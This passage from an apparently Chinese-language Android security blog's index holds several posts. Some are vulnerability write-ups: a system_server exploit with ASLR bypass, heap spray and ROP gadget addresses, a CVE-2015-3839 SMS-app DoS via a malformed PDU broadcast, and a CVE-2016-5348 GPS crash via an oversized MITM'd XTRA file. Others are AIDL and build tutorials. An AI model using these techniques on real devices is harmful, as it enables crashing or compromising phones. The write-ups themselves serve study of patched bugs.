class="line">&#125;</span><br></pre></td></tr></table></figure><p>除此以外，攻击者还必须克服Android中的漏洞缓解技术——ASLR和DEP。</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="1-绕过ASLR"><a href="#1-绕过ASLR" class="headerlink" title="1.绕过ASLR"></a>1.绕过ASLR</h3><p>Android有做地址空间随机化ASLR，但是所有的app都是fork自zygote进程，基础模块的内存布局全部是相同的，也就是说我们可以简单的绕过system_server的ASLR。</p><p>shell@hammerhead:/ # cat /proc/10156/maps | grep dalvik-heap<br>4273c000-616da000 rw-p 00000000 00:04 32910      /dev/ashmem/dalvik-heap (deleted)<br>shell@hammerhead:/ # cat /proc/18446/maps | grep dalvik-heap<br>4273c000-616da000 rw-p 00000000 00:04 32910      /dev/ashmem/dalvik-heap (deleted)</p><h3 id="2-堆喷射"><a href="#2-堆喷射" class="headerlink" title="2. 堆喷射"></a>2. 堆喷射</h3><p>system_server进程向android设备提供绝大部分的系统服务，通过这些服务的一些特定方法我们可以向system_server传输一个String，同时system_server把这个String存储在Dalvik-heap中不被销毁（因为我们需要使用注入代码段对这片内存区域进行填充</p><h3 id="3-栈翻转和rop"><a href="#3-栈翻转和rop" class="headerlink" title="3. 栈翻转和rop"></a>3. 栈翻转和rop</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">        内存构造如下：</span><br><span class="line">                    --------------------------------------------------.</span><br><span class="line">                    staticAddr + gadgetChunkOffset                    .</span><br><span class="line">                    staticAddr + gadgetChunkOffset - 4                .</span><br><span class="line">                    staticAddr + gadgetChunkOffset - 4*i          slide code</span><br><span class="line">                    ...                                               .</span><br><span class="line">                    ...                                               .</span><br><span class="line">                    1                                                 .</span><br><span class="line">                    ---------------------------------------------------</span><br><span class="line">                    gadget_0_addr  //shell_code_begin_here</span><br><span class="line">                    staticAddr + 0xC //shell_code + 4</span><br><span class="line">                    gadget_1_addr    //shell_code + 8</span><br><span class="line">                    gadget_2_addr    //shell_code + 12</span><br><span class="line">                    ********</span><br><span class="line">                    R0              //shell_code + 16  system函数的参数</span><br><span class="line">                    ...</span><br><span class="line">                    ...</span><br><span class="line">                    ...</span><br><span class="line">                    system_addr     //shell_code + 64</span><br><span class="line">                    ...</span><br><span class="line">                    ...</span><br><span class="line">         */</span><br></pre></td></tr></table></figure><p>其中ROP构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">        rop[0]:(libwebviewchromium.so 0x004fed00)ldr r4, [r5, #4] ; mov r0, r5 ; ldr r7, [r5] ; ldr.w r8, [r4, #0x48] ; ldr r1, [r7, #8] ; blx r1</span><br><span class="line">        rop[1]:(libdvm.so 0x00068e5a ) mov sp, r7 ; pop &#123;r3, r4, r7, pc&#125;</span><br><span class="line">        rop[2]:(libwebviewchromium.so 0x007dfc0c ) add r1, sp, #8 ; ldr r3, [sp, #0x30] ; mov r0, sp ; blx r3</span><br><span class="line">        rop[3]:(libc.so system函数 0x250E0)</span><br><span class="line">         */</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Android AIDL笔记</title>
      <link href="/2017/12/09/Android-AIDL%E7%AC%94%E8%AE%B0/"/>
      <url>/2017/12/09/Android-AIDL%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>在Android系统中，通常一个进程不能访问其它进程的内存。AIDL(Android Interface definition language)允许定义客户端和服务端都同意为了彼此之间的通信使用进程间通信（IPC）的编程接口，其本质是用Binder实现的。</p><p>以下为一个简单的AIDL实例</p><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><h3 id="1-新建AIDL文件"><a href="#1-新建AIDL文件" class="headerlink" title="1.新建AIDL文件"></a>1.新建AIDL文件</h3><p>首先用Android Studio 新建一个Android工程，这里命名为com.example.AIDL_Server。在工程目录下，“右键“-&gt;”New”-&gt;”AIDL File”,这里接口命名为“MyAidl”，每个.aidl文件必须定义一个接口并且只需要接口声明。</p><p>这里定义接口方法为Add，返回客户端输入的两个数之和。MyAidl.aidl文件如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.aidl_server.myapplication;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">MyAidl</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着Make一下，自动会生成对应的Java文件，生成的文件名和.aidl文件名匹配，但扩展名为.java，本质为Binder实现。</p><p>###2.实现接口<br>上一步定义好了接口和Add方法，需要进一步实现。新建一个Service，在Service中新建一个内部类MyAidl.Stub,在该类中实现Add接口。</p><h3 id="3-对外暴漏接口"><a href="#3-对外暴漏接口" class="headerlink" title="3.对外暴漏接口"></a>3.对外暴漏接口</h3><p>在Service中的onBind函数中返回接口，另外还需注意在manifest文件中声明Service接口，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Add</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> MyAidl.Stub mRemote = <span class="keyword">new</span> MyAidl.Stub()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">Add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> a+b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mRemote;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="1-复制AIDL文件"><a href="#1-复制AIDL文件" class="headerlink" title="1.复制AIDL文件"></a>1.复制AIDL文件</h3><p>当客户端与服务器不在同一个应用程序中时，客户端必须也复制一份AIDL文件到其目录下，并且包的路径和名称不能改动，这里直接将服务端AIDL目录整体复制到客户端main目录下，同样编译后生成对应的Java文件。</p><h3 id="2-新建ServiceConnection对象"><a href="#2-新建ServiceConnection对象" class="headerlink" title="2.新建ServiceConnection对象"></a>2.新建ServiceConnection对象</h3><p>当一个客户端（例如activity）调用bindService()连接到这个service，客户端的onServiceConnected()回调接收到由service的onBind()返回的mBinder实例。</p><p>import远程AIDL包，定义一个远程AIDL对象，新建一个ServiceConnection对象，在其ServiceConnection（）函数中将接收到的Binder进行转换。</p><h3 id="3-远程调用"><a href="#3-远程调用" class="headerlink" title="3.远程调用"></a>3.远程调用</h3><p>调用Add进行加法运算，注意捕获RemoteException异常。代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> MyAidl mRemote = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> ServiceConnection sc= <span class="keyword">new</span> ServiceConnection() &#123;</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceConnected</span><span class="params">(ComponentName componentName, IBinder iBinder)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">           mRemote =   MyAidl.Stub.asInterface(iBinder);</span><br><span class="line">           System.out.println(<span class="string">"-----Connect---------"</span>);</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceDisconnected</span><span class="params">(ComponentName componentName)</span> </span>&#123;</span><br><span class="line">           mRemote=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">       setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">       Intent intent = <span class="keyword">new</span> Intent(<span class="string">"com.example.aidl_server.myapplication.Add"</span>);</span><br><span class="line"></span><br><span class="line">       bindService(intent,sc, Context.BIND_AUTO_CREATE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       Button bt = (Button) findViewById(R.id.button);</span><br><span class="line">       bt.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   System.out.println(mRemote.Add(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">                   Toast.makeText(MainActivity.<span class="keyword">this</span>, String.valueOf(mRemote.Add(<span class="number">1</span>, <span class="number">2</span>)),Toast.LENGTH_SHORT).show();</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">catch</span> (RemoteException e)&#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h2><ul><li>服务端的Service需要启动，我是在MainActivity 里new Add（）才启动服务</li><li>bindService时，Intent名字要对应</li><li>客户端直接在OnCreate函数里进行远程调用失败，加了个Button在onClick里调用正常</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="http://yuweiguocn.github.io/2016/03/31/android-guide-aidl/" target="_blank" rel="noopener">Android开发指南——进程间通信AIDL</a></li><li><a href="http://www.cnblogs.com/BeyondAnyTime/p/3204119.html" target="_blank" rel="noopener">android中的AIDL进程间通信</a></li><li><a href="http://blog.csdn.net/lmj623565791/article/details/38461079/" target="_blank" rel="noopener">AIDL binder框架浅析（比较详细）</a></li><li><a href="http://android.blog.51cto.com/268543/537684/" target="_blank" rel="noopener">另一篇比较详细的</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>cve-2015-3839(短信 Dos)</title>
      <link href="/2017/12/09/cve-2015-3839-%E7%9F%AD%E4%BF%A1-Dos/"/>
      <url>/2017/12/09/cve-2015-3839-%E7%9F%AD%E4%BF%A1-Dos/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>漏洞发生在Android自带短信应用中updateMessageStatus函数中，该函数用于发送短信完成后更新状态。代码中未对异常进行处理（使用try…finally…，未加catch），且相关的服务对外暴露，恶意程序可以构造恶意的短信发送广播，导致自带的短信应用无法工作。</p><p>漏洞代码如下：</p><p><img src="/images/pasted-1.png" alt="upload successful"></p><p>当message为null时，访问message对象中的函数或变量就会发生空指针异常，导致短信应用Crash.</p><p>函数开始对message是否为空作了判断，因此需要绕过判断。createFromPdu函数是对收到的pdu格式的短信进行解析，返回一个SmsMessage对象，如下图：</p><p><img src="/images/pasted-2.png" alt="upload successful"></p><p>该函数根据format的格式（3GPP为GSM，3GPP2为CMDA）去解析PDU，最后返回一个wrappedMessage对象，最后的return没有直接返回wrappedMessage对象，而是通过new的方式返回，导致返回值永不为null。因此，只要wrappedMessage对象为null时，就会绕过”if (message==null)”的检查，触发空指针异常。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>为使wrappedMessage对象为null,只需要构造一个无效的PDU串即可。</p><p>&gt;<br>PDU为发送短信时一种固定的编码格式，一般的PDU编码由A B C D E F G H I J K L M十三项组成。<br>A：短信息中心地址长度，2位十六进制数(1字节)。<br>B：短信息中心号码类型，2位十六进制数。<br>C：短信息中心号码，B+C的长度将由A中的数据决定。<br>D：文件头字节，2位十六进制数。<br>E：信息类型，2位十六进制数。<br>F：被叫号码长度，2位十六进制数。<br>G：被叫号码类型，2位十六进制数，取值同B。<br>H：被叫号码，长度由F中的数据决定。<br>I：协议标识，2位十六进制数。<br>J：数据编码方案，2位十六进制数。<br>K：有效期，2位十六进制数。<br>L：用户数据长度，2位十六进制数。<br>M：用户数据，其长度由L中的数据决定。J中设定采用UCS2编码，这里是中英文的Unicode字符。<br>&gt;</p><p>考虑到第一个字节为长度标志位，只要将其置0即可够造一个恶意的PDU,参考<a href="http://www.multisilicon.com/_a/blog/a22201774~/pdu.htm" target="_blank" rel="noopener">PDU在线解析</a>，这里伪造的PDU如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0091683108200505F0</span><br></pre></td></tr></table></figure></p><p>为触发漏洞代码，需要找到漏洞代码的调用路径，跟踪短信源码发现updateMessageStatus函数在MessageStatusService服务中，查看menifest文件发现MessageStatusService并没有对外导出。但是短信应用注册了一个recever叫做MessageStatusReceiver，它收到广播后会开启MessageStatusService服务，因此，通过发送“com.android.mms.transaction.MessageStatusReceiver.MESSAGE_STATUS_RECEIVED”广播可以触发漏洞代码。</p><p>为保证createFromPdu不会返回null,还需要指定短信的format为3gpp或3gpp2。此外，若要对短信应用进行DOS，需要不停的发送广播。</p><p>PoC代码见<a href="https://github.com/mabin004/cve-2015-3839_PoC" target="_blank" rel="noopener">https://github.com/mabin004/cve-2015-3839_PoC</a></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>由<a href="https://android.googlesource.com/platform/packages/apps/Mms/+/f8fd79b464192b33be09a472f0691273479f9f86%5E%21/#F0" target="_blank" rel="noopener">漏洞patch</a>可以看出，google在漏洞代码处加了catch来捕获空指针异常。</p><p><img src="/images/pasted-3.png" alt="upload successful"></p><p>##总结</p><p>这个漏洞的存在关键在两个地方：</p><ol><li>没有加catch捕获异常，如果加catch后，任何DoS攻击都无效；</li><li>return的时候没有进行判断，直接new一个对象就return了，这里是绕过null检查的关键</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Android源码编译命令</title>
      <link href="/2017/12/09/Android%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%91%BD%E4%BB%A4/"/>
      <url>/2017/12/09/Android%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="1-编译过程"><a href="#1-编译过程" class="headerlink" title="1.编译过程"></a>1.编译过程</h2><pre><code>1) source build/envsetup.sh2) lunch,选择编译的平台3）make －j4</code></pre><p>##2. 命令介绍</p><pre><code>1）m        编译整个android工程2）mm    编译当前目录下模块，不包括依赖项3）mmm path  编译指定目录下的模块4）mma 编译当前目录下所有模块，包括依赖项5）mmma path 编译指定目录下所有模块，含依赖项PS： mm／mmm编译较快，mma／mmma会把所有的依赖项一同编译，比较缓慢，首次编译时用mma，以后用mm编译。</code></pre><h2 id="3-Android-mk解析"><a href="#3-Android-mk解析" class="headerlink" title="3.Android.mk解析"></a>3.Android.mk解析</h2><h3 id="1-mk文件"><a href="#1-mk文件" class="headerlink" title="1. mk文件"></a>1. mk文件</h3><pre><code>  一个android子项目中会存在一个或多个Android.mk文件 1) 单一的Android.mk文件 直接参考NDK的sample目录下的hello-jni项目，在这个项目中只有一个Android.mk文件 2) 多个Android.mk文件 如果需要编译的模块比较多，我们可能会将对应的模块放置在相应的目录中， 这样，我们可以在每个目录中定义对应的Android.mk文件（类似于上面的写法）， 最后，在根目录放置一个Android.mk文件，内容如下：    include $(call all-subdir-makefiles)只需要这一行就可以了，它的作用就是包含所有子目录中的Android.mk文件 </code></pre><h3 id="2-变量"><a href="#2-变量" class="headerlink" title="2. 变量"></a>2. 变量</h3><p>注意：‘:=’是赋值的意思；’+=’是追加的意思；‘$’表示引用某变量的值。</p><pre><code>1）LOCAL_PATH:  这个变量用于给出当前文件的路径。   必须在 Android.mk 的开头定义，可以这样使用：          LOCAL_PATH := $(call my-dir)    如当前目录下有个文件夹名称 src，则可以这样写 $(call src)，那么就会得到 src 目录的完整路径    这个变量不会被$(CLEAR_VARS)清除，因此每个 Android.mk 只需要定义一次(即使在一个文件中定义了几个模块的情况下)。2）CLEAR_VARS:  必须在开始一个新模块之前包含这个脚本：include$(CLEAR_VARS)，用于重置除LOCAL_PATH变量外的，所有LOCAL_XXX系列变量。3）LOCAL_MODULE: 这是模块的名字，它必须是唯一的，而且不能包含空格。    4）LOCAL_SRC_FILES:  这是要编译的源代码文件列表。    只要列出要传递给编译器的文件，因为编译系统自动计算依赖。注意源代码文件名称都是相对于 LOCAL_PATH的，你可以使用路径部分，例如：     LOCAL_SRC_FILES := foo.c toto/bar.c\     Hello.c    文件之间可以用空格或Tab键进行分割,换行请用&quot;\&quot;    如果是追加源代码文件的话，请用LOCAL_SRC_FILES += 5）LOCAL_STATIC_LIBRARIES: 表示该模块需要使用哪些静态库，以便在编译时进行链接时就需要6）LOCAL_SHARED_LIBRARIES:  表示模块在运行时要依赖的共享库（动态库），在链接时就需要7）LOCAL_LDLIBS:  编译模块时要使用的附加的链接器选项。这对于使用‘-l’前缀传递指定库的名字是有用的。    例如，LOCAL_LDLIBS := -lz表示告诉链接器生成的模块要在加载时刻链接到/system/lib/libz.so    可查看 docs/STABLE-APIS.TXT 获取使用 NDK发行版能链接到的开放的系统库列表。8）LOCAL_MODULE_PATH 和 LOCAL_UNSTRIPPED_PATH    在 Android.mk 文件中， 还可以用LOCAL_MODULE_PATH 和LOCAL_UNSTRIPPED_PATH指定最后的目标安装路径.    不同的文件系统路径用以下的宏进行选择：    TARGET_ROOT_OUT：表示根文件系统。    TARGET_OUT：表示 system文件系统。    TARGET_OUT_DATA：表示 data文件系统。    用法如：LOCAL_MODULE_PATH :=$(TARGET_ROOT_OUT) 9）BUILD_STATIC_LIBRARY：编译为静态库。     BUILD_SHARED_LIBRARY ：编译为动态库     BUILD_EXECUTABLE：编译为Native C可执行程序</code></pre><h2 id="4-编译后的文件"><a href="#4-编译后的文件" class="headerlink" title="4. 编译后的文件"></a>4. 编译后的文件</h2><pre><code> 经过make编译后的产物，都位于/out目录，该目录下主要关注下面几个目录：1）. /out/host：Android开发工具的产物，包含SDK各种工具，比如adb，dex2oat，aapt等。2) /out/target/common：通用的一些编译产物，包含Java应用代码和Java库；3） /out/target/product/[product_name]：针对特定设备的编译产物以及平台相关C/C++代码和二进制文件；其中，有几个重量级的镜像文件：system.img:挂载为根分区，主要包含Android OS的系统文件；ramdisk.img:主要包含init.rc文件和配置文件等；userdata.img:被挂载在/data，主要包含用户以及应用程序相关的数据；当然还有boot.img，reocovery.img等镜像文件，这里就不介绍了。</code></pre><p>##5. 编译遇到的问题</p><p>###1. GC overhead limit exceeded<br>解决：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export JACK_SERVER_VM_ARGUMENTS="-Dfile.encoding=UTF-8 -XX:+TieredCompilation -Xmx4g"</span><br><span class="line"></span><br><span class="line">./prebuilts/sdk/tools/jack-admin kill-server</span><br><span class="line"></span><br><span class="line">./prebuilts/sdk/tools/jack-admin start-server</span><br></pre></td></tr></table></figure><h3 id="2-lunch一定要在根目录"><a href="#2-lunch一定要在根目录" class="headerlink" title="2. lunch一定要在根目录"></a>2. lunch一定要在根目录</h3><p>lunch一定要在根目录进行，否则会删除之前编译好的文件。</p><p>例如：我先全部编译一遍，此时在out目录下生成镜像文件。如果再新建一个Terminal，cd 到其它目录里，source一下，然后lunch，此时我原先编译好的文件都丢失了。</p><h3 id="3-编译完成后刷入镜像"><a href="#3-编译完成后刷入镜像" class="headerlink" title="3. 编译完成后刷入镜像"></a>3. 编译完成后刷入镜像</h3><p>make snod命令</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cve-2016-5348(利用大文件使gps crash)</title>
      <link href="/2017/12/09/cve-2016-5348-%E5%88%A9%E7%94%A8%E5%A4%A7%E6%96%87%E4%BB%B6%E4%BD%BFgps-crash/"/>
      <url>/2017/12/09/cve-2016-5348-%E5%88%A9%E7%94%A8%E5%A4%A7%E6%96%87%E4%BB%B6%E4%BD%BFgps-crash/</url>
      
        <content type="html"><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>通过中间人攻击（MITM）构造一个gps相关的文件（由Qualcomm提供），可以使Android设备的gps服务崩溃，设备重启。问题出现在AOSP代码和由Quanlcomm实现的XTRA下载代码中。该漏洞还有可能影响所有的Qualcomm GPS芯片。</p><h2 id="背景-GPS和gpsOneXtra"><a href="#背景-GPS和gpsOneXtra" class="headerlink" title="背景(GPS和gpsOneXtra)"></a>背景(GPS和gpsOneXtra)</h2><p>大多数移动设备通过GPS（Global Positioning System）实现定位，它由美国的军事部门开发和维护，其他国家也有类似的定位系统，如俄罗斯的GLONASS，欧洲的Galileo，中国的北斗。</p><p>广播星历是定位卫星发出的无线电信号上载有预报一定时间内卫星根数的电文信息，通过星历接收者可以很快获得离自己最近的卫星，避免了依次去查找卫星。</p><p>Qualcomm开发了一套系统称为gpsOneXtra,通过它设备可以从高通的服务器上下载卫星数据（Xtra文件），该文件包含了当前的卫星位置数据以及未来7天卫星可能的位置，大多数的高通gps芯片都支持这项技术。</p><p>##背景2 -Android和gpsOneXtra文件</p><p>通过对Android设备的流量监控发现，每当设备连接到WiFi网络时，会向高通的服务器发起请求，获取gpsOneXtra文件。在Android相关的源码中，出现了以下url:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xtra1.gpsonextra.net/xtra.bin</span><br><span class="line">http://xtra2.gpsonextra.net/xtra.bin</span><br><span class="line">http://xtra3.gpsonextra.net/xtra.bin</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xtrapath1.izatcloud.net/xtra2.bin</span><br><span class="line">http://xtrapath2.izatcloud.net/xtra2.bin</span><br><span class="line">http://xtrapath3.izatcloud.net/xtra2.bin</span><br></pre></td></tr></table></figure><p>使用whois工具查询这些域名，发现gpsonextra.net和izatcloud.net都是高通的域名，进一步研究发现他们用的Amazon的云服务。</p><p>进一步查看Android源码发现，该请求由系统级别的Java代码发起<a href="https://android.googlesource.com/platform/frameworks/base/+/ac6d896222051ceeb68dcdd4283f3aee18ec1046/services/core/java/com/android/server/location/GpsXtraDownloader.java" target="_blank" rel="noopener">GpsXtraDownloader.java</a>,之后通过JNI传到native代码中<a href="https://android.googlesource.com/platform/frameworks/base/+/f6527aebbce5e2b6b771fa42ae499c2e7584bd26/services/core/jni/com_android_server_location_GnssLocationProvider.cpp" target="_blank" rel="noopener">com_android_server_location_GnssLocationProvider.cpp</a>,最终交由高通的硬件来解析。</p><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>Android设备在连接wifi时会自动下载XTRA文件，然而相关的代码并未检查XTRA文件的大小，如果一个XTRA文件大小超过了机器的最大内存，设备就会重启。攻击者通过MITM，将下载请求链接到自己伪造的XTRA大文件，从而造成远程拒绝服务攻击。</p><p>漏洞发生在以下代码中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#GpsXtraDownloader.java, lines 120-127</span><br><span class="line">connection.connect();</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> statusCode = connection.getResponseCode();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (statusCode != HttpURLConnection.HTTP_OK) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (DEBUG) Log.d(TAG, “HTTP error downloading gps XTRA: “</span><br><span class="line"></span><br><span class="line">+ statusCode);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Streams.readFully(connection.getInputStream());</span><br></pre></td></tr></table></figure><p>整个过程未检测文件的大小，且使用readFully会将整个文件读到内存中，因此会造成内存不足，设备重启。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol><li>更改手机hosts文件（/etc/hosts），把相关域名指向攻击者控制的服务器；</li><li>服务器上放一个超过设备内存大小的文件</li><li>打开/关闭wifi，或者打开/关闭飞行模式</li></ol><p>Note:由于缓存并非每次都会下载XTRA文件，此时需要重启手机或者参考<a href="http://stackoverflow.com/questions/14548707/android-how-to-reset-and-download-a-gps-data" target="_blank" rel="noopener">http://stackoverflow.com/questions/14548707/android-how-to-reset-and-download-a-gps-data</a>。也可以安装如<a href="https://play.google.com/store/apps/details?id=com.eclipsim.gpsstatus2" target="_blank" rel="noopener">GPS Status</a> 、<a href="https://play.google.com/store/apps/details?id=com.eclipsim.gpsstatus2" target="_blank" rel="noopener">ToolboxGPS Status</a>等工具.</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在Java层和native层增加了对XTRA文件大小的检查。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Android源码结构</title>
